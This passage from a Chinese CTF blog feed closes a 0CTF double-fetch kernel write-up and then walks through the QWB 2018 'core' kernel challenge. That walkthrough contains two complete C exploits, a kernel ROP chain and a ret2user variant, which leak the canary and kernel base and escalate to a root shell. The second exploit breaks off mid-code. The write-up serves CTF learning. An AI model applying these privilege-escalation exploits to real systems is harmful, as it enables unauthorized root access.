rel="noopener">https://blogs.technet.microsoft.com/srd/2008/10/14/ms08-061-the-case-of-the-kernel-mode-double-fetch/</a>.]</strong></p><p><strong><em>用户通常会通过调用内核函数完成特定功能，当内核函数两次从同一用户内存地址读取同一数据时，通常第一次读取用来验证数据或建立联系，第二次则用来使用该数据。与此同时，用户空间并发运行的恶意线程可以在两次内核读取操作之间，利用竞争条件对该数据进行篡改，从而造成内核使用数据的不一致。Double fetch漏洞可造成包括缓冲区溢出、信息泄露、空指针引用等后果，最终造成内核崩溃或者恶意提权。</em></strong></p><p>也就是说，参数是从用户态传进来的，当用户态对传入的结构体改变时，内核读到的数据也会被改变。</p><p>因此，在用户态新建一个线程不断的修改传入的结构体中flag指针为内核flag的值。当驱动运行时，恰好通过地址验证后，在数据判断之前内核数据flag地址被改掉的话，则可以做到通过内容验证，从而打印出flag内容。</p><p>printk输出的内容可以用dmesg来查看。</p><p>此处有个坑点，是QEMU默认启动时会使用当个core、单个thread，这样内核相当于是单进程的。</p><p>而单进程的内核很难触发这个漏洞，因此需要在QEMU启动时设置好内核和进程数如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-m 256M -smp 2,cores=2,threads=1  \</span><br></pre></td></tr></table></figure><p>这个问题坑了我好久，此处非常感谢<a href="https://veritas501.space/" target="_blank" rel="noopener">Veritas501师傅</a>。</p><p>具体EXP，<a href="https://veritas501.space/2018/06/04/0CTF%20final%20baby%20kernel/" target="_blank" rel="noopener">Veritas501师傅的文章</a>写的很好了，我没有什么创新点就不写了。</p><p><img src="/img/0ctf-babyko/0.png" alt=""></p><h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p><a href="https://veritas501.space/2018/06/04/0CTF%20final%20baby%20kernel/" target="_blank" rel="noopener">https://veritas501.space/2018/06/04/0CTF%20final%20baby%20kernel/</a></p><p><a href="https://www.secspace.com/view-ff3bbe863b544a929f96110e7b8992c8-e5cf621eacdb49b3b35b71a20e0ce9be.html" target="_blank" rel="noopener">https://www.secspace.com/view-ff3bbe863b544a929f96110e7b8992c8-e5cf621eacdb49b3b35b71a20e0ce9be.html</a></p>]]></content>
    
    <summary type="html">
    
      这个比赛也过去好久了，比赛的时候没有去线下赛，只能赛后复现一下。拿这道题来作为入门的第二道KERNEL PWN吧...
    
    </summary>
    
    
      <category term="KERNEL" scheme="http://p4nda.top/tags/KERNEL/"/>
    
      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
    
      <category term="CTF" scheme="http://p4nda.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>【KERNEL PWN】强网杯CTF2018 core题解</title>
    <link href="http://p4nda.top/2018/07/13/ciscn2018-core/"/>
    <id>http://p4nda.top/2018/07/13/ciscn2018-core/</id>
    <published>2018-07-13T02:01:41.000Z</published>
    <updated>2018-11-13T11:23:25.785Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://pan.baidu.com/s/1AIG5vXKOMFIYSGmEdiJNRA" target="_blank" rel="noopener">题目及相关文件下载</a>，密码：914k</p><p>这是一道接近于libc的overflowme的题目了，调试还是比较麻烦，如果大佬们有好用的kernel用gdb插件麻烦告知我一下，环境好容易崩溃啊…</p><h1 id="core"><a href="#core" class="headerlink" title="core"></a>core</h1><h2 id="题目-amp-漏洞分析"><a href="#题目-amp-漏洞分析" class="headerlink" title="题目&amp;漏洞分析"></a>题目&amp;漏洞分析</h2><p>题目中注册了core_write、core_ioctl，而在core_ioctl中会根据参数去调用core_read、core_copy_func函数。</p><p>core_write: 用户可以向全局变量中写入一个不大于0x800的字符串内容</p><p><img src="/img/QWB_core/1-1.png" alt=""></p><p>core_ioctl：分为3个case，维护了一个全局变量，当参数为0x6677889c的时候，可以设置这个变量，其余情况会分别调用core_read、core_copy_func函数</p><p><img src="/img/QWB_core/1-2.png" alt=""></p><p>core_read：会根据core_ioctl维护的全局变量，从栈上读出长度为0x40的数据，这里很显然可以越界读数据，栈上的返回地址、canary之类的都可以读到</p><p><img src="/img/QWB_core/1-3.png" alt=""></p><p>core_copy_func：会根据用户的输入长度，从name这个全局变量中向栈上读出数据。在判断时这个变量的类型是signed long long，而读出的时候变成了signed short，显然存在一个截断，当使用如0xf000000000000300这样的数据就可以绕过限制，造成内核的栈溢出。可以说是为了出题而出题了…</p><p><img src="/img/QWB_core/1-4.png" alt=""></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>首先检查一下内核的安全保护机制，通过查看start.sh发现没有开启smep，开启了kalsr和canary的。所谓smep是内核为了避免ret2user的利用方法增加的一种保护方法，即内核代码不能跳转到用户空间去执行代码，绕过方法也很简单，使用内核的ROP就可以了，但此题由于没有这个保护，可以直接使用ret2user的攻击方法。</p><p>题目给出的目录结构是这样的：</p><p>core.cpio：这是一个打包的文件，解包以后发现里面有文件系统，其中以vmlinux命名的是内核的二进制文件，core.ko是存在漏洞的驱动，也就是题目分析中分析的二进制文件。</p><p>start.sh： 启动脚本，标明启动的方法、保护措施等</p><p>bzImage：镜像文件</p><p>这里类比于libc中的pwn，感觉*.ko就是binary文件，vmlinux就是libc … 不同的是保护机制是由如何启动决定的。</p><h3 id="内存地址泄露"><a href="#内存地址泄露" class="headerlink" title="内存地址泄露"></a>内存地址泄露</h3><p>这个漏洞在分析中已经说过了，在ioctl中设置全局变量的值，然后利用core_read函数可以泄露栈上的数据：</p><p>首先先对core驱动下断点，断点的下法是，首先在qemu中查看/sys/module/core/sections/.text文件，找到镜像加载的基地址：</p><p><img src="/img/QWB_core/2-1.png" alt=""></p><p>然后在gdb端，执行<strong><em>add-symbol-file ./core/core.ko 0xffffffffc03a0000</em></strong> ，为驱动增加符号表</p><p><img src="/img/QWB_core/2-2.png" alt=""></p><p>这样就可以下断点了，首先看一下再core_read的栈内容。</p><p><img src="/img/QWB_core/2-3.png" alt=""></p><p>由于kernel pwn 的最终目的是提权到root，一种简单的方法是执行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br></pre></td></tr></table></figure><p>而commit_creds、prapare_kernel_cred都是内核函数，在vmlinux中，因此还需要泄露vmlinux的基地址。</p><p>而在栈地址中并不能看出来哪个地址属于vmlinux，这里用一个应该算是复杂的方法吧。</p><p>首先找到这两个函数在vmlinux的偏移：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">'./core/vmlinux'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"commit_creds"</span>,hex(elf.symbols[<span class="string">'commit_creds'</span>]<span class="number">-0xffffffff81000000</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"prepare_kernel_cred"</span>,hex(elf.symbols[<span class="string">'prepare_kernel_cred'</span>]<span class="number">-0xffffffff81000000</span>)</span><br></pre></td></tr></table></figure><p><img src="/img/QWB_core/2-4.png" alt=""></p><p>在qemu里查看/proc/kallsyms中的 commit_creds 函数地址</p><p><img src="/img/QWB_core/2-5.png" alt=""></p><p>而计算之后，找到vmlinux的基址：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Python <span class="number">2.7</span><span class="number">.12</span> (default, Nov <span class="number">20</span> <span class="number">2017</span>, <span class="number">18</span>:<span class="number">23</span>:<span class="number">56</span>) </span><br><span class="line">[GCC <span class="number">5.4</span><span class="number">.0</span> <span class="number">20160609</span>] on linux2</span><br><span class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> <span class="keyword">or</span> <span class="string">"license"</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hex(<span class="number">0xffffffffba89c8e0</span><span class="number">-0x9c8e0</span>)</span><br><span class="line"><span class="string">'0xffffffffba800000L'</span></span><br></pre></td></tr></table></figure><p>可以发现在栈上有一条数据在vmlinux不远处，距离为0x9dd6d1</p><h3 id="控制RIP"><a href="#控制RIP" class="headerlink" title="控制RIP"></a>控制RIP</h3><p>能够泄露vmlinux、驱动和canary了以后，就变得比较容易了。</p><p>首先预先构造好ROP，使用core_write写入到全局变量name中备用。</p><p>执行<strong><em>ROPgadget –binary vmlinux &gt; 1.txt</em></strong>保存gadget备用，这个过程慢到令人发指…</p><p>而在core_copy_func中，构造长度为0xf000000000000300，即可成功覆盖RIP</p><h3 id="ROP构造"><a href="#ROP构造" class="headerlink" title="ROP构造"></a>ROP构造</h3><p>其实，提取过程很容易，流程是：</p><p>1 <strong><em>执行 commit_creds(prepare_kernel_cred(0))</em></strong>，此时该进程已经是id为0的root进程了，但是仍在内核态中。而这条语句的执行可以用ROP来做，由于SMEP没开，ret2user也可以，ret2user就是在编写的程序中写入一个函数调用该函数，将ROP的该部分直接写成用户态函数的地址；</p><p>2 <strong><em>执行swapgs</em></strong>，准备回到用户态</p><p>3 iretq回到用户态，在rsp指向的位置布置好相关寄存器的值，特别的将rip寄存器的值保存为执行system(“/bin/sh”)，再返回用户态后就可以拿到一个root权限的shell了。</p><p><img src="/img/QWB_core/0.png" alt=""></p><h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><h2 id="rop"><a href="#rop" class="headerlink" title="rop"></a>rop</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setoff</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">long</span> <span class="keyword">long</span> size)</span></span>&#123;</span><br><span class="line">ioctl(fd,<span class="number">0x6677889C</span>,size);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">core_read</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">char</span> *buf)</span></span>&#123;</span><br><span class="line">ioctl(fd,<span class="number">0x6677889b</span>,buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">core_copy_func</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">long</span> <span class="keyword">long</span> size)</span></span>&#123;</span><br><span class="line">ioctl(fd,<span class="number">0x6677889a</span>,size);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_cs, user_ss, user_eflags,user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_stats</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">asm</span>(</span><br><span class="line"><span class="string">"movq %%cs, %0\n"</span></span><br><span class="line"><span class="string">"movq %%ss, %1\n"</span></span><br><span class="line"><span class="string">"movq %%rsp, %3\n"</span></span><br><span class="line"><span class="string">"pushfq\n"</span></span><br><span class="line"><span class="string">"popq %2\n"</span></span><br><span class="line">:<span class="string">"=r"</span>(user_cs), <span class="string">"=r"</span>(user_ss), <span class="string">"=r"</span>(user_eflags),<span class="string">"=r"</span>(user_sp)</span><br><span class="line"> :</span><br><span class="line"> : <span class="string">"memory"</span></span><br><span class="line"> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> fd ;</span><br><span class="line"><span class="keyword">size_t</span> tmp ;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">0x50</span>];</span><br><span class="line"><span class="keyword">size_t</span> shellcode[<span class="number">0x100</span>];</span><br><span class="line"><span class="keyword">size_t</span> vmlinux_base,canary,module_core_base;</span><br><span class="line"><span class="keyword">size_t</span> commit_creds =  <span class="number">0x9c8e0</span>;</span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred = <span class="number">0x9cce0</span>;</span><br><span class="line">save_stats();</span><br><span class="line">fd = open(<span class="string">"/proc/core"</span>,O_RDWR);</span><br><span class="line"><span class="keyword">if</span>(fd &lt; <span class="number">0</span> )&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Open /proc/core error!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">setoff(fd,<span class="number">0x40</span>);</span><br><span class="line">core_read(fd,buf);</span><br><span class="line"><span class="comment">/*for test</span></span><br><span class="line"><span class="comment">for(int i = 0;i&lt;8;i++)&#123;</span></span><br><span class="line"><span class="comment">tmp = *(size_t *)(&amp;buf[i*8]);</span></span><br><span class="line"><span class="comment">printf("[%d] %p\n",i,tmp);</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">size_t</span> pop_rdi = <span class="number">0x000b2f</span>;</span><br><span class="line"><span class="keyword">size_t</span> push_rax =  <span class="number">0x02d112</span>;</span><br><span class="line"><span class="keyword">size_t</span> swapgs = <span class="number">0x0d6</span>;</span><br><span class="line"><span class="keyword">size_t</span> iret ;</span><br><span class="line"><span class="keyword">size_t</span> xchg = <span class="number">0x16684f0</span>;</span><br><span class="line"><span class="keyword">size_t</span> call_rax=<span class="number">0x40398</span>;</span><br><span class="line"><span class="keyword">size_t</span> pop_rcx = <span class="number">0x21e53</span>;</span><br><span class="line"><span class="keyword">size_t</span> pop_rbp = <span class="number">0x3c4</span>; <span class="comment">//: pop rbp ; ret</span></span><br><span class="line"><span class="keyword">size_t</span> pop_rdx = <span class="number">0xa0f49</span> ;<span class="comment">//: pop rdx ; ret</span></span><br><span class="line"><span class="keyword">size_t</span> mov_rdi_rax_call_rdx = <span class="number">0x01aa6a</span>;</span><br><span class="line">vmlinux_base = (*(<span class="keyword">size_t</span> *)(&amp;buf[<span class="number">4</span>*<span class="number">8</span>])<span class="number">-0x1dd6d1</span> );</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+] vmlinux_base:%p\n"</span>,vmlinux_base);</span><br><span class="line">canary = (*(<span class="keyword">size_t</span> *)(&amp;buf[<span class="number">0</span>]));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+] canary:%p\n"</span>,canary);</span><br><span class="line">module_core_base = (*(<span class="keyword">size_t</span> *)(&amp;buf[<span class="number">2</span>*<span class="number">8</span>])<span class="number">-0x19b</span> );</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+] module_core_base:%p\n"</span>,module_core_base);</span><br><span class="line">commit_creds+=vmlinux_base;</span><br><span class="line">prepare_kernel_cred += vmlinux_base;</span><br><span class="line">pop_rdi += vmlinux_base;</span><br><span class="line">push_rax += vmlinux_base;</span><br><span class="line">swapgs += module_core_base ;</span><br><span class="line">iret = <span class="number">0x50ac2</span>+vmlinux_base;</span><br><span class="line">xchg += vmlinux_base;</span><br><span class="line">call_rax += vmlinux_base;</span><br><span class="line">pop_rcx += vmlinux_base;</span><br><span class="line">mov_rdi_rax_call_rdx +=vmlinux_base;</span><br><span class="line">pop_rdx += vmlinux_base;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+] commit_creds:%p\n"</span>,commit_creds);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+] prepare_kernel_cred:%p\n"</span>,prepare_kernel_cred);</span><br><span class="line"><span class="comment">//shellcode[0]=shellcode[0]</span></span><br><span class="line"><span class="comment">//shellcode[] =</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">9</span>;i++)&#123;</span><br><span class="line">shellcode[i]=canary;</span><br><span class="line">&#125; </span><br><span class="line">shellcode[<span class="number">9</span>] = (*(<span class="keyword">size_t</span> *)(&amp;buf[<span class="number">1</span>]) );</span><br><span class="line">shellcode[<span class="number">10</span>] = pop_rdi;<span class="comment">//0xdeadbeefdeadbeef;</span></span><br><span class="line">shellcode[<span class="number">11</span>] = <span class="number">0</span>;</span><br><span class="line">shellcode[<span class="number">12</span>] = prepare_kernel_cred;</span><br><span class="line"></span><br><span class="line">shellcode[<span class="number">13</span>] = pop_rdx;</span><br><span class="line">shellcode[<span class="number">14</span>] = pop_rcx;</span><br><span class="line">shellcode[<span class="number">15</span>] = mov_rdi_rax_call_rdx;</span><br><span class="line">shellcode[<span class="number">16</span>] = commit_creds;</span><br><span class="line">shellcode[<span class="number">17</span>] = swapgs;</span><br><span class="line">shellcode[<span class="number">18</span>] = shellcode;</span><br><span class="line">shellcode[<span class="number">19</span>] = iret;</span><br><span class="line">shellcode[<span class="number">20</span>] = (<span class="keyword">size_t</span>)get_shell;</span><br><span class="line">shellcode[<span class="number">21</span>] = user_cs;</span><br><span class="line">shellcode[<span class="number">22</span>] = user_eflags;</span><br><span class="line">shellcode[<span class="number">23</span>] = user_sp;</span><br><span class="line">shellcode[<span class="number">24</span>] = user_ss;</span><br><span class="line"></span><br><span class="line">write(fd,shellcode,<span class="number">25</span>*<span class="number">8</span>);</span><br><span class="line">core_copy_func(fd,<span class="number">0xf000000000000000</span>+<span class="number">25</span>*<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ret2user"><a href="#ret2user" class="headerlink" title="ret2user"></a>ret2user</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_cs, user_ss, user_eflags,user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_stats</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">asm</span>(</span><br><span class="line"><span class="string">"movq %%cs, %0\n"</span></span><br><span class="line"><span class="string">"movq %%ss, %1\n"</span></span><br><span class="line"><span class="string">"movq %%rsp, %3\n"</span></span><br><span class="line"><span class="string">"pushfq\n"</span></span><br><span class="line"><span class="string">"popq %2\n"</span></span><br><span class="line">:<span class="string">"=r"</span>(user_cs), <span class="string">"=r"</span>(user_ss), <span class="string">"=r"</span>(user_eflags),<span class="string">"=r"</span>(user_sp)</span><br><span class="line"> :</span><br><span class="line"> : <span class="string">"memory"</span></span><br><span class="line"> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//eip =(unsigned long long) get_shell;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNCALL __attribute__((regparm(3)))</span></span><br><span class="line"><span class="keyword">void</span>* (*prepare_kernel_cred)(<span class="keyword">void</span>*) KERNCALL ;</span><br><span class="line"><span class="keyword">void</span> (*commit_creds)(<span class="keyword">void</span>*) KERNCALL ;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">()</span></span>&#123;</span><br><span class="line">      commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setoff</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">int</span> off)</span></span>&#123;</span><br><span class="line">ioctl(fd,<span class="number">0x6677889C</span>,off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">core_read</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">char</span> *buf)</span></span>&#123;</span><br><span class="line">ioctl(fd,<span class="number">0x6677889B</span>,buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">core_copy</span><span class="params">(<span class="keyword">int</span> fd , <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> len)</span></span>&#123;</span><br><span class="line">ioctl(fd, <span class="number">0x6677889A</span>,len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">save_stats() ; </span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> buf[<span class="number">0x40</span>/<span class="number">8</span>];</span><br><span class="line"><span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="number">0x40</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> canary ;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> module_base ;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> vmlinux_base ; </span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> iretq ;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> swapgs ;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> rop[<span class="number">0x30</span>];</span><br><span class="line"><span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="number">0x30</span>*<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> fd = open(<span class="string">"/proc/core"</span>,O_RDWR);</span><br><span class="line"><span class="keyword">if</span>(fd == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"open file error\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"open file success\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] buf: 0x%p"</span>,buf);</span><br><span class="line">setoff(fd,<span class="number">0x40</span>);</span><br><span class="line">core_read(fd,buf);</span><br><span class="line">canary = buf[<span class="number">0</span>];</span><br><span class="line">module_base =  buf[<span class="number">2</span>] - <span class="number">0x19b</span>;</span><br><span class="line">vmlinux_base = buf[<span class="number">4</span>] - <span class="number">0x16684f0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] canary: 0x%p"</span>,canary);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] module_base: 0x%p"</span>,module_base);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] vmlinux_base: 0x%p"</span>,vmlinux_base);</span><br><span class="line">commit_creds = vmlinux_base + <span class="number">0x9c8e0</span>;</span><br><span class="line">prepare_kernel_cred = vmlinux_base + <span class="number">0x9cce0</span>;</span><br><span class="line">iretq = vmlinux_base + <span class="number">0x50ac2</span>;</span><br><span class="line">swapgs  = module_base + <span class="number">0x0d6</span>;</span><br><span class="line">rop[<span class="number">8</span>] = canary ; 